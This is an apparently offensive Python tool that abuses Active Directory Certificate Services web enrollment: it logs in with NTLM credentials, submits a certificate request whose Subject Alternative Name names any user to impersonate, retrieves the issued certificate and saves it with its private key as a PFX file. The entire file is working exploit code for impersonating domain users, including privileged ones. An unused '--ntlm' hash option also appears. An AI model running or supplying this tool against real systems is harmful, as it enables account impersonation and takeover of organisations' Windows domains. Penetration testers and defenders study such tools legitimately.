# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#   Ex Android Dev (@ExAndroidDev)
#   Matt Johnson @breakfix
#

import re
import base64
import requests
import sys
from OpenSSL import crypto
from argparse import ArgumentParser
from requests_ntlm import HttpNtlmAuth

def generate_ad_certificate(url, session, username, san, template, outpass):

    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 4096)

    csr = generate_csr(key, username, san)
    csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")

    print("[*] CSR generated!")

    data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, template)

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print("[*] Sending CSR to endpoint {server}...".format(server="{url}/certsrv/certfnsh.asp".format(url=url)))

    response = session.post("{url}/certsrv/certfnsh.asp".format(url=url), data=data, headers=headers)

    if response.status_code != 200:
        print("[*] Error getting certificate! Make sure you have entered valid certificate template.")
        print(response.status_code)
        print(response.text)
        return

    found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', response.text)
    if len(found) == 0:
        print("[*] Error obtaining certificate!")
        print(response.text)
        return

    certificate_id = found[0]

    response = session.get("{url}/certsrv/certnew.cer?ReqID={id}".format(url=url, id=certificate_id))

    print("[*] GOT CERTIFICATE!")

    certificate = response.text

    certificate_store = generate_pfx(key, certificate, outpass)

    print('[*] Generating PKCS12 file for user "%s" ' % (san))

    outfile = "{user}.pfx".format(user=san)

    try:
        open(outfile, 'wb' ).write(certificate_store)
        print("[*] Wrote PKCS12 file to {path}".format(path=outfile))
    except Exception as e:
        print("[!] Error could not write PKCS12 file: " + str(e))

def generate_csr(key, CN, SAN):
    print("[*] Generating CSR...")
    req = crypto.X509Req()
    req.get_subject().CN = SAN
    # Subject Alternative Name 
    san = "otherName:1.3.6.1.4.1.311.20.2.3;UTF8:{user}".format(user=SAN)
    req.add_extensions([crypto.X509Extension(
                    "subjectAltName".encode(), False,
                    san.encode('ascii'))])
    req.set_pubkey(key)
    req.sign(key, "sha256")

    return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)

def generate_pfx(key, certificate, outpass):
    certificate = crypto.load_certificate(crypto.FILETYPE_PEM, certificate)
    p12 = crypto.PKCS12()
    p12.set_certificate(certificate)
    p12.set_privatekey(key)
    return p12.export(passphrase=outpass)

def main():

    args = ArgumentParser()
    args.add_argument('-s', '-srv', dest='srv', type=str, default='', help='AD CS Server including protocol e.g http://ad-cs')
    args.add_argument('-o', '-outpass', dest='outpass', type=str, default='', help='PKCS12 export password') 
    args.add_argument('-i', '--san', dest="san", default='', help='User to impersonate by supplying in Subject Alternative Name field')  
    args.add_argument('-t', '--template', dest="template", default='', help='AD CS template name')
    args.add_argument('-u', '--username', dest="user", default='', help='AD username')
    args.add_argument('-p', '--password', dest="password", default='', help='AD password')
    args.add_argument('-d', '--domain', dest="domain", default='', help='AD domain name')
    args.add_argument('--ntlm', action="store", default='', help='nt hash')

    # Print help if no arguments given
    if len(sys.argv)==1:
        args.print_help(sys.stderr)
        sys.exit(1)
    args = args.parse_args()

    srv = args.srv
    username = args.user
    san = args.san
    template = args.template
    outpass = args.outpass

    session = requests.Session()
    session.auth = HttpNtlmAuth('{domain}\\{user}'.format(domain=args.domain,user=args.user),args.password)

    generate_ad_certificate(srv, session, username, san, template, outpass)

if __name__ == "__main__":
    main()
